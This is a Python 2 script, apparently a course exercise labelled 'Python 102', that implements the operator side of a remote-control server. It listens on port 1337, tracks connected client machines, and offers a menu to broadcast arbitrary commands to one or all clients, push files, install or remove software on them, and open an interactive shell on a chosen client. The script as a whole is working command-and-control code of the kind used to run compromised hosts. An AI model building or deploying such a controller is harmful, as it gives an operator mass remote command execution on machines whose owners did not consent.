#!/usr/bin/python
import socket, threading, os.path, time, random, datetime


class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((self.host, self.port))

    def listen(self):
        self.s.listen(5)
        print "listening %s:%d" % (self.host, self.port)

        while True:
            conn, addr = self.s.accept()
            t = threading.Thread(target=self.listenToConnections, args=(conn, addr))
            conns.setConnection(addr[0], conn, addr, t)

    def listenToConnections(self, conn, addr):
        buffersize = 1024
        print addr

        while True:
            try:
                data = conn.recv(buffersize)
                if data:
                    print "%s: %s" % (addr[0], data)
                else:
                    print "disconnect"
                    raise Exception
            except:
                conn.close()
                return False


class Connections:
    def __init__(self):
        self.connections = {}

    def setConnection(self, ip, conn, addr, t):
        self.connections[ip] = {'socket': conn, 'addr': addr, 'thread': t}

    def getConnections(self):
        return self.connections


def showClients():
    clients = conns.getConnections()

    for client in clients:
        print client

    backToMenu()


def sendCommand():
    selected = selectionHelper()

    if not selected:
        print "Wrong selection"
        sendCommand()

    clientsHelper({
        "raw_input_text": "Execute Command: ",
        "prefix": "EXEC",
        "selection": selected,
    })


def transferFile():
    selected = selectionHelper()

    if selected:

        filePath = raw_input('Source File: ')

        if not os.path.exists(filePath):
            print "Cannot locate file"
            transferFile()

        fileDest = raw_input('File Destination: ')
        if selected.__len__() > 1:

            for client in selected:
                s = selected[client]['socket']
                addr = selected[client]['addr'][0]

                res = fileSendHelper(s, filePath, fileDest)
                print "[%s]: %s" % (addr, res)

        else:

            s = selected[1]["socket"]
            addr = selected[1]["addr"][0]

            res = fileSendHelper(s, filePath, fileDest)
            print "[%s]: %s" % (addr, res)


    else:
        raw_input('Invalid selection')
        transferFile()

    backToMenu()


def installOnClient():
    selected = selectionHelper()

    if not selected:
        backToMenu()

    clientsHelper({
        "raw_input_text": "Install: ",
        "prefix": "INST",
        "selection": selected,
    })


def removeOnClient():
    selected = selectionHelper()

    if not selected:
        backToMenu()

    clientsHelper({
        "raw_input_text": "Remove: ",
        "prefix": "RMOV",
        "selection": selected,
    })


def sendClientShell():
    # TODO: improve shell this one sucks

    selected = selectionHelper('single')

    if not selected:
        backToMenu()

    s = selected[1]['socket']
    addr = selected[1]['addr'][0]

    shellPort = random.randint(1338, 2222)
    s.send('SHEL "%d"' % shellPort)

    time.sleep(1)

    print "connecting to %s:%d" % (addr, shellPort)
    shellSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shellSocket.connect((addr, shellPort))
    shellSocket.send("uname -a")

    while True:

        res = shellSocket.recv(1024)
        print res
        cmd = raw_input("[%s]: " % addr)

        if cmd:
            shellSocket.send(cmd)


def selectionHelper(single=False):
    clients = conns.getConnections()

    if clients.__len__() == 0:
        print "No clients connected!"
        backToMenu()

    selection = {}
    i = 1

    for client in clients:

        s = clients[client]["socket"]
        t = clients[client]["thread"]
        addr = clients[client]["addr"]
        ip = addr[0]
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except:
            hostname = "%s - cannot get hostname" % ip

        print "%d) [%s %s]" % (i, ip, hostname)
        selection[str(i)] = {"socket": s, "thread": t, "addr": addr}
        i = i + 1
    if single:
        userInput = raw_input('Select a client (single): ')
        selected = selection.get(userInput, False)

        if selected:
            return {1: selection[userInput]}

        else:
            print "Wrong selection"
            selectionHelper('single')

    else:
        userInput = raw_input('Select a client (0 for all): ')

        if userInput == "0":

            selectedClients = {}

            i = 1
            for client in clients:
                selectedClients[i] = clients[client]
                i = i + 1

            return selectedClients

        else:
            selected = selection.get(userInput, False)

        if selected:
            return {1: selection[userInput]}

    return False


def clientsHelper(options):
    selection = options["selection"]
    prefix = options["prefix"]
    prompt = options["raw_input_text"]
    cmd = raw_input(prompt)
    bufferSize = 8194

    if selection.__len__() > 1:

        for client in selection:
            s = selection[client]['socket']
            addr = selection[client]['addr'][0]
            s.send('%s "%s"' % (prefix, cmd))

            while True:

                res = s.recv(bufferSize)
                print "[%s]: %s" % (addr, res)

                if len(res) < bufferSize:
                    break

        time.sleep(1)

    else:

        s = selection[1]["socket"]
        addr = selection[1]["addr"][0]
        s.send('%s "%s"' % (prefix, cmd))

        while True:

            res = s.recv(bufferSize)
            print "[%s]: %s" % (addr, res)

            if len(res) < bufferSize:
                break

        time.sleep(1)

    backToMenu()


def fileSendHelper(socket, filePath, fileDest):
    fileSrc = open(filePath, 'rb')
    fileSize = os.path.getsize(filePath)
    fileData = fileSrc.read(1024)

    socket.send('%s "%s" "%d"\n' % ('FILE', fileDest, fileSize))
    time.sleep(1)

    while (fileData):
        socket.send(fileData)
        fileData = fileSrc.read(1024)

    fileSrc.close()

    res = socket.recv(16)
    return res


def defaultCase():
    print "Invalid option"
    backToMenu()


def backToMenu():
    raw_input('Press enter to contiue...')
    menu()


def menu():
    print """
      1) Show clients
      2) Send command to clients
      3) Transfer file to clients
      4) Install on clients
      5) Remove on clients
      6) Shell on a client
      """

    userInput = raw_input("-> ")

    case = {
        "1": showClients,
        "2": sendCommand,
        "3": transferFile,
        "4": installOnClient,
        "5": removeOnClient,
        "6": sendClientShell
    }

    case.get(userInput, defaultCase)()  # DAT INVOKE


def main():
    global conns
    conns = Connections()
    server = Server('0.0.0.0', 1337)
    t = threading.Thread(target=server.listen)
    t.setDaemon(True)
    t.start()

    now = datetime.datetime.now()
    print """
    ################################################################
        Python 102          name: Ivan Radchenko            %s:%s
    ################################################################

    Segment: no idea which segment supposed to be shown
    Your dns: %s
    Your gateway: zubi

    """ % (now.hour, now.minute, socket.gethostbyname(socket.getfqdn()))

    menu()


main()
